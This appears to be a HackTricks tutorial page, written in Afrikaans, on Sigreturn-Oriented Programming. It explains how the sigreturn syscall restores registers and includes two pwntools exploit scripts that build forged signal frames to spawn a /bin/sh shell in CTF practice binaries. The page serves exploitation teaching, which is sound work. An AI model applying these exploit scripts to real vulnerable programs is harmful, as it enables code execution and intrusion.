# SROP - Sigreturn-Oriented Programming

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PR's in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basiese Inligting

**`Sigreturn`** is 'n spesiale **syscall** wat hoofsaaklik gebruik word om op te ruim nadat 'n seinhandler sy uitvoering voltooi het. Seine is onderbrekings wat deur die bedryfstelsel na 'n program gestuur word, dikwels om aan te dui dat 'n uitsonderlike situasie plaasgevind het. Wanneer 'n program 'n sein ontvang, pauzeer dit tydelik sy huidige werk om die sein met 'n **seinhandler** te hanteer, 'n spesiale funksie wat ontwerp is om met seine te werk.

Nadat die seinhandler klaar is, moet die program sy **vorige toestand hervat** asof niks gebeur het nie. Dit is waar **`sigreturn`** in die spel kom. Dit help die program om **terug te keer van die seinhandler** en herstel die program se toestand deur die stapelraam (die gedeelte van geheue wat funksie-oproepe en plaaslike veranderlikes stoor) wat deur die seinhandler gebruik is, op te ruim.

Die interessante deel is hoe **`sigreturn`** die program se toestand herstel: dit doen dit deur **alle CPU se registerwaardes op die stapel te stoor.** Wanneer die sein nie meer geblokkeer is nie, **pop `sigreturn` hierdie waardes van die stapel af**, wat effektief die CPU se registers na hul toestand voor die sein hanteer is, reset. Dit sluit die stapelpunt-register (RSP) in, wat na die huidige bokant van die stapel wys.

{% hint style="danger" %}
Om die syscall **`sigreturn`** van 'n ROP-ketting te bel en **die registerwaardes** wat ons wil h√™ dat dit in die **stapel** moet laai, by te voeg, is dit moontlik om **alle** registerwaardes te **beheer** en dus **te bel** byvoorbeeld die syscall `execve` met `/bin/sh`.
{% endhint %}

Let op hoe dit 'n **type Ret2syscall** sou wees wat dit baie makliker maak om parameters te beheer om ander Ret2syscalls aan te roep:

{% content-ref url="../rop-syscall-execv/" %}
[rop-syscall-execv](../rop-syscall-execv/)
{% endcontent-ref %}

As jy nuuskierig is, dit is die **sigcontext-struktuur** wat in die stapel gestoor word om later die waardes te herstel (diagram van [**hier**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
Vir 'n beter verduideliking kyk ook:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Voorbeeld

Jy kan [**hier 'n voorbeeld vind**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) waar die oproep na signeturn via ROP saamgestel word (die waarde `0xf` in rxa plaas), alhoewel dit die finale uitbuiting van daar is:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
Kontroleer ook die [**exploit van hier**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html) waar die bin√™re reeds `sigreturn` aangeroep het en daarom is dit nie nodig om dit met 'n **ROP** te bou nie:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## Ander Voorbeelde & Verwysings

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* Assembly bin√™re wat toelaat om **na die stapel te skryf** en dan die **`sigreturn`** syscall aanroep. Dit is moontlik om op die stapel 'n [**ret2syscall**](../rop-syscall-execv/) via 'n **sigreturn** struktuur te skryf en die vlag wat binne die geheue van die bin√™re is, te lees.
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* Assembly bin√™re wat toelaat om **na die stapel te skryf** en dan die **`sigreturn`** syscall aanroep. Dit is moontlik om op die stapel 'n [**ret2syscall**](../rop-syscall-execv/) via 'n **sigreturn** struktuur te skryf (die bin√™re het die string `/bin/sh`).
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64 bits, geen relro, geen canary, nx, geen pie. Eenvoudige buffer overflow wat die `gets` funksie misbruik met 'n gebrek aan gadgets wat 'n [**ret2syscall**](../rop-syscall-execv/) uitvoer. Die ROP-ketting skryf `/bin/sh` in die `.bss` deur weer `gets` aan te roep, dit misbruik die **`alarm`** funksie om eax op `0xf` te stel om 'n **SROP** aan te roep en 'n shell uit te voer.
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64 bits assembly program, geen relro, geen canary, nx, geen pie. Die vloei laat toe om in die stapel te skryf, verskeie registers te beheer, en 'n syscall aan te roep en dan `exit` aan te roep. Die geselekteerde syscall is 'n `sigreturn` wat registre stel en `eip` beweeg om 'n vorige syscall instruksie aan te roep en `memprotect` uit te voer om die bin√™re ruimte op `rwx` te stel en die ESP in die bin√™re ruimte te stel. Volg die vloei, die program sal weer lees in ESP aanroep, maar in hierdie geval sal ESP na die volgende instruksie wys, sodat 'n shellcode as die volgende instruksie geskryf en uitgevoer sal word.
* [https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection](https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection)
* SROP word gebruik om uitvoeringsregte (memprotect) aan die plek te gee waar 'n shellcode geplaas is.

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
